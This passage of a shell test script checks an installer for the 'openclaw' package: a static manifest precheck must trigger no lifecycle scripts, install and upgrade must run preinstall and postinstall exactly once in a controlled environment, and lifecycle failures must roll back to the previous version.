cp "$FIXTURE_PKG" "$SE_PRECHECK_DIR/package.json"
cp "$FIXTURE_PREINSTALL" "$SE_PRECHECK_DIR/scripts/preinstall-package-manager-warning.mjs"
cp "$FIXTURE_POSTINSTALL" "$SE_PRECHECK_DIR/scripts/postinstall-bundled-plugins.mjs"
rm -f "$MOCK_SE_LOG"

HARNESS_STATIC_PRECHECK="$MOCK_SE_DIR/test-static-precheck.sh"
cat > "$HARNESS_STATIC_PRECHECK" <<EOF
#!/bin/sh
set -e
export OC_SIDE_EFFECT_FILE="$MOCK_SE_LOG"
NODE_BIN="$NODE_BIN"
OC_PACKAGE_CONTRACT="$CONTRACT_JS"
log_info() { :; }
log_warn() { :; }
log_error() { :; }
EOF
awk '/^validate_openclaw_manifest\(\)/,/^\}$/' "$ENV_SCRIPT" >> "$HARNESS_STATIC_PRECHECK"
cat >> "$HARNESS_STATIC_PRECHECK" <<EOF
validate_openclaw_manifest "$SE_PRECHECK_DIR" "2026.9.1"
EOF

sh "$HARNESS_STATIC_PRECHECK" >/dev/null 2>&1 || fail "static manifest precheck on fixture must succeed"
[ ! -s "$MOCK_SE_LOG" ] || fail "static precheck must have zero side-effects (precheck executed lifecycle scripts!)"

# ── 13.2 install_openclaw 成功安装: 正式安装恰好一次、依赖可解析、受控环境与原子切换 ──
reset_se_global
rm -f "$MOCK_SE_LOG"
sh "$HARNESS_SE_INSTALL" >/dev/null 2>&1 || fail "install_openclaw with fixture should succeed"

PRE_COUNT=$(grep -c '"script":"preinstall"' "$MOCK_SE_LOG" || echo 0)
POST_COUNT=$(grep -c '"script":"postinstall"' "$MOCK_SE_LOG" || echo 0)
[ "$PRE_COUNT" -eq 1 ] || fail "install_openclaw: preinstall must be executed exactly once (actual: $PRE_COUNT)"
[ "$POST_COUNT" -eq 1 ] || fail "install_openclaw: postinstall must be executed exactly once (actual: $POST_COUNT)"

grep '"script":"preinstall"' "$MOCK_SE_LOG" | grep -q 'lib/node_modules/openclaw' || fail "install_openclaw: preinstall cwd must be candidate package directory"
grep '"script":"postinstall"' "$MOCK_SE_LOG" | grep -q 'lib/node_modules/openclaw' || fail "install_openclaw: postinstall cwd must be candidate package directory"
grep '"script":"preinstall"' "$MOCK_SE_LOG" | grep -q '"npm_config_ignore_scripts":"true"' || fail "install_openclaw: preinstall must inherit npm_config_ignore_scripts=true"
grep '"script":"postinstall"' "$MOCK_SE_LOG" | grep -q '"npm_config_ignore_scripts":"true"' || fail "install_openclaw: postinstall must inherit npm_config_ignore_scripts=true"

grep -q '"version": "2026.9.1"' "$MOCK_SE_GLOBAL/lib/node_modules/openclaw/package.json" || fail "install_openclaw: new package.json not found in OC_GLOBAL"
grep -q "2026.9.1-NEW-WRAPPER" "$MOCK_SE_GLOBAL/bin/openclaw" || fail "install_openclaw: new wrapper not installed in OC_GLOBAL"

# ── 13.3 install_openclaw lifecycle 失败时事务回滚与旧版本保持 ──
# (13.3a) preinstall 失败
reset_se_global
rm -f "$MOCK_SE_LOG"
set +e
OC_FAIL_PREINSTALL=1 sh "$HARNESS_SE_INSTALL" >/dev/null 2>&1
RC_SE_PRE_FAIL=$?
set -e
[ "$RC_SE_PRE_FAIL" -ne 0 ] || fail "install_openclaw must exit non-zero when preinstall fails"
grep -q "2026.9.0-ORIGINAL-ENTRY" "$MOCK_SE_GLOBAL/lib/node_modules/openclaw/openclaw.mjs" || fail "install_openclaw preinstall failure: old entry must be preserved"
grep -q '"version": "2026.9.0"' "$MOCK_SE_GLOBAL/lib/node_modules/openclaw/package.json" || fail "install_openclaw preinstall failure: old package.json must be preserved"
grep -q "2026.9.0-ORIGINAL-WRAPPER" "$MOCK_SE_GLOBAL/bin/openclaw" || fail "install_openclaw preinstall failure: old wrapper must be preserved"

# (13.3b) postinstall 失败
reset_se_global
rm -f "$MOCK_SE_LOG"
set +e
OC_FAIL_POSTINSTALL=1 sh "$HARNESS_SE_INSTALL" >/dev/null 2>&1
RC_SE_POST_FAIL=$?
set -e
[ "$RC_SE_POST_FAIL" -ne 0 ] || fail "install_openclaw must exit non-zero when postinstall fails"
grep -q "2026.9.0-ORIGINAL-ENTRY" "$MOCK_SE_GLOBAL/lib/node_modules/openclaw/openclaw.mjs" || fail "install_openclaw postinstall failure: old entry must be preserved"
grep -q '"version": "2026.9.0"' "$MOCK_SE_GLOBAL/lib/node_modules/openclaw/package.json" || fail "install_openclaw postinstall failure: old package.json must be preserved"
grep -q "2026.9.0-ORIGINAL-WRAPPER" "$MOCK_SE_GLOBAL/bin/openclaw" || fail "install_openclaw postinstall failure: old wrapper must be preserved"

# ── 13.4 upgrade_openclaw 成功升级: 正式升级恰好一次、依赖可解析、受控环境与原子切换 ──
reset_se_global
rm -f "$MOCK_SE_LOG"
sh "$HARNESS_SE_UPGRADE" >/dev/null 2>&1 || fail "upgrade_openclaw with fixture should succeed"

UP_PRE_COUNT=$(grep -c '"script":"preinstall"' "$MOCK_SE_LOG" || echo 0)
UP_POST_COUNT=$(grep -c '"script":"postinstall"' "$MOCK_SE_LOG" || echo 0)
[ "$UP_PRE_COUNT" -eq 1 ] || fail "upgrade_openclaw: preinstall must be executed exactly once (actual: $UP_PRE_COUNT)"
[ "$UP_POST_COUNT" -eq 1 ] || fail "upgrade_openclaw: postinstall must be executed exactly once (actual: $UP_POST_COUNT)"

grep '"script":"preinstall"' "$MOCK_SE_LOG" | grep -q 'lib/node_modules/openclaw' || fail "upgrade_openclaw: preinstall cwd must be candidate package directory"
grep '"script":"postinstall"' "$MOCK_SE_LOG" | grep -q 'lib/node_modules/openclaw' || fail "upgrade_openclaw: postinstall cwd must be candidate package directory"
grep '"script":"preinstall"' "$MOCK_SE_LOG" | grep -q '"npm_config_ignore_scripts":"true"' || fail "upgrade_openclaw: preinstall must inherit npm_config_ignore_scripts=true"
grep '"script":"postinstall"' "$MOCK_SE_LOG" | grep -q '"npm_config_ignore_scripts":"true"' || fail "upgrade_openclaw: postinstall must inherit npm_config_ignore_scripts=true"

grep -q '"version": "2026.9.1"' "$MOCK_SE_GLOBAL/lib/node_modules/openclaw/package.json" || fail "upgrade_openclaw: new package.json not found in OC_GLOBAL"
grep -q "2026.9.1-NEW-WRAPPER" "$MOCK_SE_GLOBAL/bin/openclaw" || fail "upgrade_openclaw: new wrapper not installed in OC_GLOBAL"

# ── 13.5 upgrade_openclaw lifecycle 失败时事务回滚与旧版本保持 ──
# (13.5a) preinstall 失败
reset_se_global
rm -f "$MOCK_SE_LOG"
set +e
OC_FAIL_PREINSTALL=1 sh "$HARNESS_SE_UPGRADE" >/dev/null 2>&1
RC_SE_UP_PRE_FAIL=$?
set -e
[ "$RC_SE_UP_PRE_FAIL" -ne 0 ] || fail "upgrade_openclaw must exit non-zero when preinstall fails"
grep -q "2026.9.0-ORIGINAL-ENTRY" "$MOCK_SE_GLOBAL/lib/node_modules/openclaw/openclaw.mjs" || fail "upgrade_openclaw preinstall failure: old entry must be preserved"
grep -q '"version": "2026.9.0"' "$MOCK_SE_GLOBAL/lib/node_modules/openclaw/package.json" || fail "upgrade_openclaw preinstall failure: old package.json must be preserved"
grep -q "2026.9.0-ORIGINAL-WRAPPER" "$MOCK_SE_GLOBAL/bin/openclaw" || fail "upgrade_openclaw preinstall failure: old wrapper must be preserved"

# (13.5b) postinstall 失败
reset_se_global
rm -f "$MOCK_SE_LOG"
set +e
OC_FAIL_POSTINSTALL=1 sh "$HARNESS_SE_UPGRADE" >/dev/null 2>&1
RC_SE_UP_POST_FAIL=$?
set -e
[ "$RC_SE_UP_POST_FAIL" -ne 0 ] || fail "upgrade_openclaw must exit non-zero when postinstall fails"
grep -q "2026.9.0-ORIGINAL-ENTRY" "$MOCK_SE_GLOBAL/lib/node_modules/openclaw/openclaw.mjs" || fail "upgrade_openclaw postinstall failure: old entry must be preserved"
grep -q '"version": "2026.9.0"' "$MOCK_SE_GLOBAL/lib/node_modules/openclaw/package.json" || fail "upgrade_openclaw postinstall failure: old package.json must be preserved"
grep -q "2026.9.0-ORIGINAL-WRAPPER" "$MOCK_SE_GLOBAL/bin/openclaw" || fail "upgrade_openclaw postinstall failure: old wrapper must be preserved"

echo "ok"
